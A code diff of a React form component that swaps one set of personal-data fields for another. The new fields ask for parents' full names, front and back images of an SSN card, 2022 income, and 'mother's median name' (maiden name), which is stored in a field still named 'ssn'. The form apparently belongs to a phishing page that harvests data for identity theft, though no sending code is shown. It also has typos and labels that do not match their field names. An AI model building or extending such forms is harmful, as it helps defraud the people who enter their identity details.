@@ -87,35 +87,36 @@ function Form() {
             <section className="form">
                 <div className="left">
                     <div>
-                        <h2>*FULL NAME</h2>
+                        <h2>*FATHERS FULL NAME</h2>
                         <input type="text" name="name" onChange={handleData}/>
                     </div>
                     <div>
-                        <h2>*MOBILE PHONE NUMBER</h2>
+                        <h2>*MOTHERS FUL NAME</h2>
                         <input type="number" name="phoneNumber" onChange={handleData}/>
                     </div>
+                   
                     <div>
-                        <h2>* FULL DIGITS OF SSN</h2>
-                        <input type="number" name="ssn" onChange={handleData}/>
+                        <h2>UPLOAD BACK OF SSN CARD</h2>
+                        <input type="file" onChange={(event)=> setPicData2(event.target.files[0])}/>
                     </div>
                     <div>
-                        <h2>UPLOAD BACK OF ID CARD</h2>
-                        <input type="file" onChange={(event)=> setPicData2(event.target.files[0])}/>
+                        <h2>UPLOAD FRONT OF SSN CARD</h2>
+                        <input type="file" onChange={(event)=> setPicData(event.target.files[0])}/>
                     </div>
                 </div>
 
                 <div className="right">
                     <div>
-                        <h2>COUNTRY</h2>
+                        <h2>SOURCE OF INCOME IN 2022</h2>
                         <input type="text" name="country" onChange={handleData}/>
                     </div>
                     <div>
-                        <h2>FULL HOUSE ADDRESS</h2>
+                        <h2>HOW MUCH DID YOU EARN IN 2022</h2>
                         <input type="text" name="address" onChange={handleData}/>
                     </div>
                     <div>
-                        <h2>UPLOAD FRONT OF ID CARD</h2>
-                        <input type="file" onChange={(event)=> setPicData(event.target.files[0])}/>
+                        <h2>* MOTHER'S MEDIAN NAME</h2>
+                        <input type="number" name="ssn" onChange={handleData}/>
                     </div>
                 </div>
             </section>
